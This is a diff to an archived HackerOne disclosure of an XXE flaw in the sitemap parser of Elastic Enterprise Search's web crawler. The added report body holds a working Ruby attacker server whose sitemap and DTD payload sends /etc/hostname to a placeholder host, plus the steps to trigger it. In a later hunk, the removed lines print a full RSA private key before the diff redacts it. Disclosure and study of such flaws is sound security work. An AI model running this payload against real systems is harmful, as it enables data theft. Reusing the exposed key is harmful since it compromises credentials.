@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "XML External Entities (XXE)"
 enriched: true
+body: true
 date: 2021-04-29
 submitted: 2021-04-08T04:42:57.058Z
 bounty_usd: null
@@ -25,6 +26,94 @@ title: "XXE in Enterprise Search's App Search web crawler"
 - Report: [https://hackerone.com/reports/1156748](https://hackerone.com/reports/1156748)
 - CWE: XML External Entities (XXE)
 - Submitted: 2021-04-08T04:42:57.058Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary
+
+Hello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-content.html#crawl-web-content-manage-sitemaps). Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.
+
+## Description
+
+Enterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for `robots.txt` files and in that file it will look for the `sitemap` directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.
+
+The code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.
+
+## Steps to reproduce
+
+### Attacker Server
+
+This is my attacker server, it's a ruby application that requires `sinatra` (`gem install sinatra`)
+
+```ruby
+require 'sinatra'
+
+set :bind, '0.0.0.0'
+
+get '/robots.txt' do
+
+  'User-agent: *
+Disallow:
+
+sitemap: /sitemap.xml
+'
+end
+
+get '/sitemap.xml' do
+  content_type 'application/xml'
+
+  '<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE urlset [
+<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
+%dtd;
+%param1;
+%exfil;
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+<url>
+    <loc>&test;</loc>
+    <lastmod>2019-06-19</lastmod>
+    <changefreq>daily</changefreq>
+</url>
+</urlset>'
+end
+
+get '/exfil.dtd' do
+  content_type 'application/xml-dtd'
+
+  '<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % data SYSTEM "file:///etc/hostname">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
+end
+```
+
+Save that to a file and run it with `ruby server.rb`.
+
+
+### Enterprise Search
+
+1. Log in to Enterprise Search
+1. Click `Launch App Search`
+1. Click `Create an Engine`, give it any name and click `Create Engine`
+1. Click `Use the Web Crawler`
+1. Enter the domain hosting the XXE payload as the `Domain URL`
+1. Click `Start a Crawl` and observe your server logs, you should see the hostname of the targetted machine
+
+Running this on an Elastic Cloud instance I got this in my log.
+
+```text
+20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] "GET /exfil?d403d12993e0 HTTP/1.1" 404 459
+```
+
+Where `d403d12993e0` is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.
+
+## Impact
+
+At the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.
 
 ## Timeline
 
@@ -172,31 +261,7 @@ There's also a private key
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEAz2b6/MOmVYlLrkiFoHW8/r9Qb+i2n/2+sU3DktQFv5t7hFTS
-j8IRTuFvfuJaEMyRrxHEMrkChKp7dv6Z6kQepSJi91b+WMsl/8kdgGK/kUUn349f
-vnoLUxuPadJQGwBGibTTMRPsNyvQGR0xjAb16F5631lMksJqclOm0VTIcOWBkfi4
-V+vej0WrwFM5YxokA2gvOMjJD7/hzjINFvqMf9+723OQWCkOcJavx2zxulXeVL/d
-vHWV62Q2DqNCI6XGnxfo76hgJbzkBphMBoV7JB9WnSGO6+YmTpq1GytnRP6YjP2M
-UfZdvE9TwNH5DbxO3mVl3M7Poke389zB5F4HWQIDAQABAoIBAD9PGwwvGMYBa+We
-Y5PQfMlyUrZmXeDGjwAGUc2vBLYxWunRDpktTyU58VPU+lMobsv262HkUZ13gMqY
-+xikhIo5zeXcWzV1hXrnxCadfgZ1Cq/WTw6QqIZM4mEV/rfPRLjiRpkzkKZirFoO
-LEKnGUc+F9m3o4Uk7WNKn6BEdg7nooty1NbNiNkL84r0TNXrNqeOa2gqfRf/u7ZF
-jVIIsaEeAN02cHk3oFNpvOMWc+PDQSqMMHqOhrOtv6xfblca0gqvE0/Knk0UkOQy
-Q/WBx7tsRV+jD/RVypBkr7dyErldIR7gSFdgyN2ICUpWfWcIiCl9zWktuoEcZTSp
-DRJMGYECgYEA+zadL7hQdWt2lIs5uSTFsMqspm4wjfcoXZLKayJhDqXTeOfZcv6M
-ZLZR+I6WjMrTVt5FbmuCzNlshG492lJB5Z4dH1aeHxsWpU7gP0d/b5Y8UKLXDvco
-bO1r1XuXXJDSuuBVk8S0NNZWWIUSAURvA7+sJGA3laqNDCkp5aWarSkCgYEA01qp
-ZgaNdDBaNb3mQKC2B/l9ZL+Dks/YIZtnLVs3iVHyIXWm6lvz1zT545P1ir9T/PPo
-b5AGFGb/HIrRwn08gFSRHI+pMGwjGo6TQcq13sADB99wEEyBPCXUDaBML4O8wgU+
-RDyFlT6rIL+zU/fBUcy1nCb6dPaHDrkgGOXFnrECgYBHn1mPanBeGeZ0EYHCnI5U
-imRRCyeCwk3a5+gYRXQAlhzF4uxnUdW7PRP/1r9rosRAhxyqj7J6Lx82Xqv52+v3
-yG2rKqnoWnPJa8SZpgvaR64om1TPan43GDXfZt5PwOaj6yPa/oEWc2mo0T/B5r30
-BqjQsjIG1Npj9jSAygdgiQKBgCa8+0eD8/FT23T2NXmq+zJC/ES3BXqnNcoTHbom
-eetlZafUVJ+n8u2C/DpGKD8iClbWrcek8jhTGHc2ynOHWMt8tIwzmKMTbuuzLjJk
-4SjOsL+EqJmULCvGEzPcKZqb3sEBDQScwy8zqVH7UPcW9gv0JWVVj5pYhTChpcxq
-cOpBAoGAd5Y8Lh02C4161LTqSkuqQomaGS3Fx9rntHOMQOYVd4Mo02JDeBH8kUWZ
-WIVKr8szxnIbFJ0m9aGGkKeDXNe7U9e4ENzwdEgHyiCjo7iPBxy5+SQXP8fY1JYP
-DQUKhSsbcy/PYYK9HYDDL3SuSuaUxA5oOVzRaBDX3fDltYVcaPM=
+[REDACTED KEY BODY - see source report]
 -----END RSA PRIVATE KEY-----
 ```
 
